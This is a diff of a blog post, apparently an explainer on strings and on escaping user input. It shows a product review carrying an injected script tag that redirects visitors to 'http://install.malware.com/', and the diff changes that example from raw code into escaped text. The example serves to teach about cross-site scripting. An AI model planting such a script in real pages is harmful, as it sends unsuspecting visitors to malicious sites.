@@ -55,6 +55,7 @@ That's the length of the string, which itself takes up a fixed number of bytes (
 #### Strings are for humans
 
 > All the world's a stage, and all the men and women merely players. They have their exits and their entrances; And one man in his time plays many parts.
+{: .shakespeare}
 
 You can put quite literally anything into a string (assuming infinite memory). They can accept any valid character, and as many of them as you want. The entire works of Shakespeare will happily sit in a string in a program on your computer, and take up a grand total of six whole megabytes of memory.
 
@@ -424,12 +425,8 @@ Easy. Sorted. Cushty.
 
 Except no. What if one of the reviews looks something like this?
 
-```markup
-I thought this was one of Shakespeare's best plays.
-<script>
-document.location = 'http://install.malware.com/';
-</script>
-```
+> I thought this was one of Shakespeare's best plays.
+  &lt;script&gt;document.location = 'http://install.malware.com/';&lt;/script&gt;
 
 Lovely. Everyone will be redirected to an evil website, and no one will read the other marvellous reviews. Sad faces all around.
 
